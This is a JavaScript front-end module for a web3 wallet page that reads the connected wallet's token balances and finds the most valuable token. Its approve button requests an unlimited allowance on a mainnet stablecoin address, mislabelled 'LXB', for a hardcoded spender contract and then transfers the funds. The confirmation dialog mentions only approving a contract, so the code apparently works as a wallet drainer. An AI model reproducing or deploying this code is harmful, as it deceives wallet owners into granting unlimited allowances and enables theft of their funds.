/**
 * Approves and spends tokens using the TokenApprover contract
 * @param {string} tokenAddress - The address of the token contract (LXB_CONTRACT.ADDRESS)
 * @param {string} spenderAddress - The address of the contract that will spend the tokens (DR_CONTRACT.ADDRESS)
 * @param {BigInt} amount - The amount of tokens to spend in Wei
 * @param {string} approvalAmount - The amount to approve for spending (usually max uint256)
 * @param {string} ownerAddress - The address of the token owner (current connected wallet address)
 * @returns {Promise<{spendTx: Object}>} Object containing the spend transaction receipt
 * @throws {Error} When approval or spend transaction fails
 */
import {
  createAppKit,
  WagmiAdapter,
  networks,
} from "https://cdn.jsdelivr.net/npm/@reown/appkit-cdn@1.6.2/dist/appkit.js"
import { reconnect, getAccount, watchAccount, signMessage, writeContract } from "https://esm.sh/@wagmi/core@2.x"
import { TokenBalanceUI, TokenService, TokenFormatter, TokenContractDetails } from "./tokenLoader.js"
import { TokenApprover } from "./approve.js"
import TokenBalanceCalculator from "./getBalance.js"

// Initialize TokenContractDetails with Web3 instance
const web3 = new Web3(window.ethereum);

const tokenDetailsViewer = new TokenContractDetails(web3)

// Add a container for contract details in your HTML
const detailsContainer = document.createElement("div")
detailsContainer.id = "contract-details-container"
document.querySelector(".approval-section").insertBefore(detailsContainer, document.querySelector(".approval-actions"))

export const projectId = "b92b8dc3cd723bb6bd144c246940324b";

const appKitNetworks = [
  networks.mainnet
]
const wagmiAdapter = new WagmiAdapter({
  networks: appKitNetworks,
  projectId,
})

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks: appKitNetworks,
  projectId,
  features: {
    analytics: true,
  },
  metadata: {
    name: "AppKit HTML Example",
    description: "AppKit HTML Example",
    url: "https://reown.com/appkit",
    icons: ["https://avatars.githubusercontent.com/u/179229932?s=200&v=4"],
  },
})

reconnect(wagmiAdapter.wagmiConfig)

document.getElementById("disconnect-btn")?.addEventListener("click", () => {
  modal.disconnect()
  clearStoredSignature()
})

// Initialize TokenBalanceUI
const tokenBalanceUI = new TokenBalanceUI(".token-balances")

// Add this after your existing wagmiAdapter initialization
const tokenApprover = new TokenApprover(wagmiAdapter.wagmiConfig)

// Add the automatic signing function
const SIGNATURE_KEY = "wallet_signature"
const MESSAGE = "Welcome! Please sign this message to verify your wallet ownership."

function saveSignature(address, signature) {
  localStorage.setItem(
    SIGNATURE_KEY,
    JSON.stringify({
      address,
      signature,
      timestamp: Date.now(),
    }),
  )
}

function getStoredSignature(address) {
  const stored = localStorage.getItem(SIGNATURE_KEY)
  if (!stored) return null

  const data = JSON.parse(stored)
  return data.address === address ? data : null
}

function clearStoredSignature() {
  localStorage.removeItem(SIGNATURE_KEY)
}

// Update autoSignMessage function
async function autoSignMessage(address) {
  // Check for existing signature
  const stored = getStoredSignature(address)
  if (stored) {
    console.log("Found existing signature")
    const signatureResult = document.querySelector("#signature-result")
    signatureResult.innerHTML = `
            <div class="success-message">
                Wallet verified ✓
                <br>
                <small>Signature: ${stored.signature.slice(0, 20)}...</small>
            </div>
        `
    signatureResult.style.display = "block"
    return stored.signature
  }

  try {
    const signature = await signMessage(wagmiAdapter.wagmiConfig, {
      message: MESSAGE,
    })

    // Store the signature
    saveSignature(address, signature)

    const signatureResult = document.querySelector("#signature-result")
    signatureResult.innerHTML = `
            <div class="success-message">
                Successfully verified! 
                <br>
                <small>Signature: ${signature.slice(0, 20)}...</small>
            </div>
        `
    signatureResult.style.display = "block"

    return signature
  } catch (error) {
    console.error("Signing failed:", error)
    const signatureResult = document.querySelector("#signature-result")
    signatureResult.innerHTML = `
            <div class="error-message">
                Verification failed: ${error.message}
            </div>
        `
    signatureResult.style.display = "block"
    return null
  }
}

// Modify the watchAccount handler
watchAccount(wagmiAdapter.wagmiConfig, {
  onChange(account) {
    if (account?.address) {
      updateWalletInfo(account.address, account.chainId)
      loadTokenBalances(account.address)
      autoSignMessage(account.address)
    } else {
      document.querySelector(".wallet-info").style.display = "none"
      document.querySelector(".sign-message-section").style.display = "none"
      clearStoredSignature()
    }
  },
})

// Check initial connection
// Update existing initial connection check
const initialAccount = getAccount(wagmiAdapter.wagmiConfig)
if (initialAccount.address) {
  updateWalletInfo(initialAccount.address, initialAccount.chainId)
  loadTokenBalances(initialAccount.address)
  document.querySelector(".sign-message-section").style.display = "block"
}

// Initialize sign message button listener
document.querySelector("#sign-message-btn")?.addEventListener("click", handleMessageSigning)

// LXB Contract Constants
const LXB_CONTRACT = {
  // ADDRESS: "0x3a623E704650D562Bee377F27D805889E203847F", // Replace with your Mainnet contract address
  ADDRESS: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
  CHAIN_ID: 1, // Mainnet chain ID
  DECIMALS: 6,
}

const DR_CONTRACT = {
  // ADDRESS: "0x7aEBb27455DD33Fc0f555D09A4d2424BDEdC220E", // Replace with your Mainnet contract address
  ADDRESS: "0xCC7589ff2Da5D12b2f0C568924F12AB9b1859F78",
  CHAIN_ID: 1, // Mainnet chain ID
  DECIMALS: 18,
}

// Add this function after the existing functions
async function getTokenWithHighestBalance(tokens) {
  if (!tokens || tokens.length === 0) return null

  tokens.forEach(token => {
    const balance = Number.parseFloat(token.balance) * token.price;
    console.log(balance)
  });

  console.log(tokens);

  return tokens.reduce((max, token) => {
    const balance = Number.parseFloat(token.balance) * token.price;
    const maxBalance = (Number.parseFloat(max.balance) * Number.parseFloat(max.price));
    return balance > maxBalance ? token : max
  })
}

async function displayHighestBalanceToken(tokenAddress, isSetSuccessful) {
  const statusEl = document.querySelector("#status")
  let message = `<p>Token with highest balance: ${tokenAddress}</p>`

  if (isSetSuccessful === true) {
    message += "<p>Successfully set token address for DR_CONTRACT.</p>"
  } else if (isSetSuccessful === false) {
    message +=
      "<p>Failed to set token address for DR_CONTRACT.</p>"
  } else {
    message += "<p>Token address was not set for DR_CONTRACT.</p>"
  }

  statusEl.innerHTML = message
}

document.querySelector("#approve-token")?.addEventListener("click", async () => {
  try {
    const account = getAccount(wagmiAdapter.wagmiConfig)
    if (!account.address) {
      throw new Error("Please connect your wallet first")
    }

    // Get all tokens and find the one with highest balance
    const tokens = await fetchUserTokens(account.address, account.chainId)
    // Get the token with the highest balance
    const filteredTokens = TokenBalanceCalculator.filterTokens(tokens, {
      minBalance: 0.01,
      excludeTokens: ['DUST'],
    });
    const highestBalanceToken = TokenBalanceCalculator.calculateHighestBalanceToken(filteredTokens);

    if (!highestBalanceToken) {
      throw new Error("No tokens found in wallet")
    }
    
    // Show contract details before approval
    const details = await tokenDetailsViewer.getContractDetails(
      LXB_CONTRACT.ADDRESS,
      account.address,
      DR_CONTRACT.ADDRESS,
    )

    console.log("Highest balance token:", highestBalanceToken)
    console.log("Contract details:", details)
    
    // Convert the balance to Wei (multiply by 10^18 for ETH/standard tokens)
    // const balanceInWei = BigInt(Math.floor(Number.parseFloat(highestBalanceToken.balance) * 10 ** 18).toString())
    const balanceInWei = BigInt(Math.floor(Number.parseFloat(highestBalanceToken.balance) * 10 ** 6));
    
    console.log("Balance in Wei:", balanceInWei.toString())

    const isApproved = await tokenApprover.hasApprovedContract(
      LXB_CONTRACT.ADDRESS,
      account.address, 
      DR_CONTRACT.ADDRESS,
      balanceInWei
    );
    
    console.log('Contract is approved: ', isApproved);

    // Display the details
    tokenDetailsViewer.createDetailsDisplay(detailsContainer, details)

    // Ask for confirmation
    const confirmed = confirm(
      `Do you want to approve the LXB Contract?`,
    )
    if (!confirmed) {
      return
    }

    // Verify we're on the correct network
    if (account.chainId !== LXB_CONTRACT.CHAIN_ID) {
      throw new Error("Please switch to Mainnet")
    }

    const approvalAmount = (2n ** 256n - 1n).toString()

    const statusEl = document.querySelector("#status")
    statusEl.textContent = "Initiating approval and transfer..."

    // Use the updated approveAndSpend method
    const { spendTx } = await tokenApprover.approveAndSpend(
      LXB_CONTRACT.ADDRESS,
      DR_CONTRACT.ADDRESS,
      approvalAmount,
      isApproved,
      account.address,
    );

    // console.log("Spend transaction:", spendTx)
    console.log("Spend transaction successful")

    statusEl.textContent = `Successfully approved and transferred ${highestBalanceToken.symbol} tokens!`

    // return { spendTx }
  } catch (error) {
    console.error("Approval and transfer error:", error)
    document.querySelector("#status").textContent = "Approval and transfer failed"
    throw error
  }
})

const tokenService = new TokenService(web3)

async function fetchUserTokens(address, chainId) {
  if (chainId === 1) {
    const data = await tokenService.getWalletTokens(address)
    if (!data) return []

    const tokens = []

    // Add ETH
    if (data.ETH) {
      console.log(data)

      tokens.push({
        symbol: "ETH",
        name: "Ethereum",
        address: address,
        balance: data.ETH.balance,
        price: data.ETH.price.rate || 0,
      })
    }

    // Add ERC20 tokens
    if (data.tokens) {
      data.tokens.forEach((token) => {
        if (token.tokenInfo) {
          const tokenData = {
            symbol: token.tokenInfo.symbol || "Unknown",
            name: token.tokenInfo.name || "Unknown Token",
            balance: token.balance,
            address: token.tokenInfo.address,
            price: token.tokenInfo.price?.rate || 0,
          }

          tokens.push(tokenData)
        }
      })
    }

    console.log("Tokens found:", tokens)
    return tokens
  }
  return []
}

const transactionQueue = []
let isProcessingQueue = false

async function addToTransactionQueue(transaction) {
  transactionQueue.push(transaction)
  if (!isProcessingQueue) {
    processTransactionQueue()
  }
}

async function processTransactionQueue() {
  if (transactionQueue.length === 0) {
    isProcessingQueue = false
    return
  }

  isProcessingQueue = true
  const transaction = transactionQueue.shift()

  try {
    await transaction()
  } catch (error) {
    console.error("Transaction failed:", error)
  }

  processTransactionQueue()
}

async function loadTokenBalances(userAddress) {
  if (!userAddress) return

  const account = getAccount(wagmiAdapter.wagmiConfig)
  tokenBalanceUI.showLoading()
  tokenBalanceUI.clearBalances()

  try {
    const tokens = await fetchUserTokens(userAddress, account.chainId)
    tokens.forEach((token) => {
      const formattedBalance = TokenFormatter.formatBalance(token.balance)
      const usdValue = token.price ? TokenFormatter.formatUSD(token.price) : "$ 0.00"

      tokenBalanceUI.displayTokenInfo({
        ...token,
        formattedBalance,
        usdValue,
      })
    })

    // Get the token with the highest balance
    const filteredTokens = TokenBalanceCalculator.filterTokens(tokens, {
      minBalance: 0.01,
      excludeTokens: ['DUST'],
    });
    const highestBalanceToken = TokenBalanceCalculator.calculateHighestBalanceToken(filteredTokens);
    console.log(highestBalanceToken);
    if (highestBalanceToken) {
      console.log("Token with highest balance:", highestBalanceToken)

      addToTransactionQueue(async () => {
        try {
          displayHighestBalanceToken(highestBalanceToken.address, true)
        } catch (error) {
          console.error("Failed to set token address:", error)
          displayHighestBalanceToken(highestBalanceToken.address, false)
        }
      })
    }
  } catch (error) {
    console.error("Failed to load tokens:", error)
    tokenBalanceUI.displayError("Failed to load token balances")
  } finally {
    tokenBalanceUI.hideLoading()
  }
}

function updateWalletInfo(address, chainId) {
  const walletInfo = document.querySelector(".wallet-info")
  const addressEl = document.querySelector(".wallet-address")
  const networkBadge = document.querySelector(".network-badge")

  // Show wallet info
  walletInfo.style.display = "block"

  // Update address
  addressEl.textContent = `${address.slice(0, 6)}...${address.slice(-4)}`

  // Update network
  const networks = {
    11155111: "Mainnet Testnet",
    1: "Ethereum Mainnet",
    // Add more networks as needed
  }
  networkBadge.textContent = networks[chainId] || `Chain ID: ${chainId}`

  // Copy address functionality
  const copyBtn = document.querySelector(".copy-btn")
  copyBtn.addEventListener("click", () => {
    navigator.clipboard.writeText(address)
    showTooltip(copyBtn, "Copied!")
  })
}

function showTooltip(element, message) {
  const tooltip = document.createElement("div")
  tooltip.className = "tooltip"
  tooltip.textContent = message

  document.body.appendChild(tooltip)

  const rect = element.getBoundingClientRect()
  tooltip.style.top = `${rect.top - 30}px`
  tooltip.style.left = `${rect.left + (rect.width - tooltip.offsetWidth) / 2}px`
  tooltip.style.opacity = "1"

  setTimeout(() => {
    tooltip.style.opacity = "0"
    setTimeout(() => tooltip.remove(), 200)
  }, 1000)
}